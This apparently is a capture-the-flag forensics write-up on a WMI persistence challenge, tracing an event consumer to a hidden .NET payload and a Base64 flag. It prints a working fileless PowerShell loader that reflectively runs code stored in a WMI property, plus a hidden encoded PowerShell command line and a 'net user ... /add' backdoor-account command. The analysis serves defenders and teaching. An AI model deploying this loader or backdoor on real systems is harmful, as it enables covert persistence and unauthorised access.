# Hacker Holidays 2026 · The Byte Lotus Hotel — "After Hours"

**Category:** Forensics
**Difficulty:** Medium
**Points:** 90
**Platform:** TryHackMe

## Challenge Brief

> Long after the front desk closes and the pool lights dim, the resort's back-office machines keep humming. Someone, or something, has been logging in during the small hours, well after the night-shift technician has gone home.
>
> Nothing obvious shows up in Startup, Scheduled Tasks, or the registry Run keys. Whatever's keeping itself alive is hiding somewhere quieter, tucked away in a corner of the system most tools don't think to check.

**Objectives:**
1. Parse the provided system artifacts for hidden custom configuration data
2. Locate the malicious class and extract its embedded payload
3. Decode the payload and submit the recovered flag

## Initial Triage

The provided attachment contained five files:

```
INDEX.BTR
MAPPING1.MAP
MAPPING2.MAP
MAPPING3.MAP
OBJECTS.DATA
```

`file` reported all five as generic `data`, but the naming and file set are a signature match for a **Windows WMI CIM repository** — normally found at:

```
C:\Windows\System32\wbem\Repository\
```

This tracks directly with the brief: nothing shows up in Startup, Scheduled Tasks, or Run keys because the persistence mechanism lives in the WMI object store, a location most forensic triage tooling and Autoruns-style checks don't inspect by default.

## Parsing the CIM Repository

Used Mandiant's `python-cim` (from the `flare-wmi` project) to parse the repository structure:

```bash
git clone https://github.com/mandiant/flare-wmi.git
pip install funcy hexdump intervaltree vivisect-vstruct-wb --break-system-packages
```

`CIM.from_path()` auto-detects the repository type (Win7-style, in this case) from `MAPPING1.MAP`'s header. From there, `ObjectResolver` was used to walk namespaces and enumerate class definitions and instances.

Enumerating instances under `root\subscription` (the namespace WMI event subscriptions live in) surfaced two objects:

```
CommandLineEventConsumer | Name=EngineTelemetryConsumer
NTEventLogEventConsumer  | Name=SCM Event Log Consumer
```

`EngineTelemetryConsumer` stood out — a generic, telemetry-flavored name designed to blend into legitimate WMI consumer traffic.

## The Persistence Mechanism

Dumping the `CommandLineEventConsumer` instance's properties exposed its `CommandLineTemplate`:

```
cmd /C powershell.exe -Sta -Nop -Window Hidden -enc JABmAGkAbABlAC...
```

Decoding the `-enc` Base64 blob (UTF-16LE) gave:

```powershell
$file = ([WmiClass]'ROOT\cimv2:Win32_HardwareTelemetry').Properties['ConfigData'].Value;
$o = New-Object IO.MemoryStream;
$d = New-Object IO.Compression.DeflateStream([IO.MemoryStream][Convert]::FromBase64String($file),[IO.Compression.CompressionMode]::Decompress);
$b = New-Object Byte[](1024);
$r = $d.Read($b,0,1024);
while($r -gt 0){
    $o.Write($b,0,$r);
    $r = $d.Read($b,0,1024);
}
[Reflection.Assembly]::Load($o.ToArray()).EntryPoint.Invoke($null,@(,[string[]]@()))|Out-Null
```

This is a classic **fileless WMI loader**: it pulls a payload out of a custom property on a WMI class, inflates it, and reflectively loads and executes it as a .NET assembly — entirely in memory, with no payload ever touching disk.

## Locating the Malicious Class

`Win32_HardwareTelemetry` is a real, legitimate-sounding Windows class name, but the attacker had grafted an extra property onto it — **`ConfigData`** — that doesn't exist on the stock class. This is the "malicious class" referenced in the brief: rather than inventing an obviously suspicious class name, the payload was hidden as a bolt-on property of something that looks like normal telemetry.

Reading the class definition's `ConfigData` default value from `root\cimv2` yielded a ~2.2KB Base64 string.

## Extracting and Decoding the Payload

```python
import base64, zlib

raw = base64.b64decode(config_data)          # 1658 bytes
pe  = zlib.decompress(raw, -15)              # raw DEFLATE, no zlib header
open('payload.exe', 'wb').write(pe)           # 4096 bytes
```

`file` confirmed the result:

```
payload.exe: PE32 executable (GUI) Intel 80386 Mono/.Net assembly, for MS Windows, 3 sections
```

## Reversing the .NET Assembly

Used `dnfile` to parse the ECMA-335 metadata directly (no Windows/.NET runtime needed):

```python
import dnfile
pe = dnfile.dnPE('payload.exe')
```

- **TypeDef:** `AfterHours.Program`
- **Methods:** `Main`, `.ctor`

The interesting content lived in the **User String heap** (`#US`), which held UTF-16LE literals embedded directly in the IL:

```
bytelotusdc
cmd.exe
/c net user patch VEhNe1A0dGNoX29wM25lZF90aDNfQmFjS2QwMHJ9 /add
Execution halted: Environment mismatch.
```

The payload's actual behavior was to create a local backdoor account (`patch`) — and its "password" argument is Base64-encoded, not a real password at all.

## Recovering the Flag

```python
import base64
base64.b64decode("VEhNe1A0dGNoX29wM25lZF90aDNfQmFjS2QwMHJ9").decode()
```

```
THM{P4tch_op3ned_th3_BacKd00r}
```

## Summary / Attack Chain

```
WMI __EventFilter/Consumer subscription (root\subscription)
        └─ CommandLineEventConsumer "EngineTelemetryConsumer"
                └─ Base64+UTF16 encoded PowerShell (-enc)
                        └─ Reads ConfigData property off Win32_HardwareTelemetry (root\cimv2)
                                └─ Base64-decode → raw DEFLATE-decompress
                                        └─ .NET assembly, reflectively loaded in memory
                                                └─ net user patch <base64 flag> /add
```

## Key Takeaways

- **WMI persistence hides in the CIM repository itself**, not the registry or filesystem — `INDEX.BTR` / `MAPPING*.MAP` / `OBJECTS.DATA` should be part of any thorough Windows persistence hunt.
- Attackers can **attach arbitrary properties to legitimate-sounding WMI class names** to smuggle payload data past casual inspection; class/property enumeration diffed against a known-good baseline is the reliable detection method.
- `-enc` PowerShell should always be decoded and read before drawing any conclusions — the outer encoding is trivial, but it's what lets malicious command lines evade naive string-matching.
- **Fileless .NET loading** (`Assembly.Load` + `EntryPoint.Invoke`) via reflection leaves no payload on disk; the CIM repository was the only place the actual malware ever "existed" at rest.
- Pure-Python tools (`python-cim`, `dnfile`) were sufficient to fully reconstruct and analyze the chain without a Windows sandbox.

## Tools Used

- [`flare-wmi` / `python-cim`](https://github.com/mandiant/flare-wmi) — WMI CIM repository parsing
- `dnfile` — pure-Python ECMA-335 (.NET metadata) parser
- Python `base64` / `zlib` — payload decoding
